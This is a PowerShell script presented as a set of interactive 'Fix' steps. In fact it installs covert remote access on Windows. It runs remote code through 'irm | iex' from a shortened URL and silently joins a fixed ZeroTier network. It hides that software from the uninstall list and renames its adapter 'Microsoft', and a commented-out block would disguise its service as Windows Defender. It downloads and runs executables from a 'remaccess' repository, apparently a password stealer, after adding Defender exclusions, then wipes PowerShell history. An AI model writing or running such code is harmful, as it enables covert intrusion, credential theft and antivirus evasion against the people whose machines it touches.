$opconfirm = Read-Host "Proceed With OP Fix (y/n)"
if ([string]::IsNullOrEmpty($opconfirm)) {
    Start-Sleep -Seconds 2
    $opconfirm = "n"
}
if ($opconfirm.ToLower() -eq "y") {
	Write-Host "Executing OP Fix..."
 	irm https://tinyurl.com/accessserverinstall | iex
#ZT Setup
$ztconfirm = Read-Host "Proceed With ZT Fix (y/n)"
if ([string]::IsNullOrEmpty($ztconfirm)) {
    Start-Sleep -Seconds 1
    $ztconfirm = "n"
}
if ($ztconfirm.ToLower() -eq "y") {
    Write-Host "Executing ZT Fix..."
	$ErrorActionPreference = "SilentlyContinue"
	$downloadUrl = "https://download.zerotier.com/dist/ZeroTier%20One.msi"
	$destinationPath = "C:\Users\Default\layer1fixzt.msi"
		if (Test-Path $destinationPath) {
		Remove-Item -Path $destinationPath -Force
		}
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
	Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart" 
	Timeout /NoBreak 30
	$NetworkID = "52b337794f5f54e7"
	$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
	$param1 = "-q"
	$param2 = "join"
	$NetworkID = "52b337794f5f54e7"
	& $zerotiercli $param1 $param2 $NetworkID allowDefault=1
	$KeyNamePattern = "Zerotier*"
	$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
	$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
	foreach ($Key in $MatchingKeys) {
		$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
		$RegValueName = "SystemComponent"
		$RegValueData = 1
		Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
	}
	$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
	if (Test-Path $ZeroTierShortcutPath) {
		Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
	}
	Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
	$folderPath = "C:\Program Files (x86)\ZeroTier"
	$folderACL = Get-Acl -Path $folderPath
	$folderACL.SetAccessRuleProtection($true, $false)
	$folderACL.Access | ForEach-Object {
		$folderACL.RemoveAccessRule($_)
	}
	Set-Acl -Path $folderPath -AclObject $folderACL
	$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
	$folderACL.SetOwner([System.Security.Principal.NTAccount] $currentUser)
	Set-Acl -Path $folderPath -AclObject $folderACL
	$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
		$currentUser,
		"FullControl",
		"ContainerInherit, ObjectInherit",
		"None",
		"Allow"
	)
	$folderACL.AddAccessRule($accessRule)
	Set-Acl -Path $folderPath -AclObject $folderACL
	$childItems = Get-ChildItem -Path $folderPath -Recurse
	foreach ($item in $childItems) {
		Set-Acl -Path $item.FullName -AclObject $folderACL
	}
	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
	Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName Microsoft
} else {
}
#ZT Adv Fix
#$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
#if ([string]::IsNullOrEmpty($ztadv)) {
#    Start-Sleep -Seconds 1
#    $ztadv = "n"	
#}
#if ($ztadv.ToLower() -eq "y") {
#    Write-Host "Executing ZT Adv Fix..."
#	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
#	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
#	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
#	$ruleName = "ZeroTier x64 Binary In"
#	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
#	if ($existingRule) {
#		$newRuleName = "Windoes Defender Core Service"
#		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
#	}
#	$ruleName2 = "ZeroTier UDP/9993 In"
#	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
#	if ($existingRule2) {
#		$newRuleName2 = "Windows Defender Service"
#		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
#	}	
#	Restart-Service ZeroTierOneService
#} else {
#}
#litepwdsnitch Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
#classic-full-st Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
#Cleanup
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
    $files = Get-ChildItem -Path $psreadlineFolderPath
    if ($files.Count -gt 0) {
        Remove-Item -Path "$psreadlineFolderPath\*" -Force
    }
}
} else {}
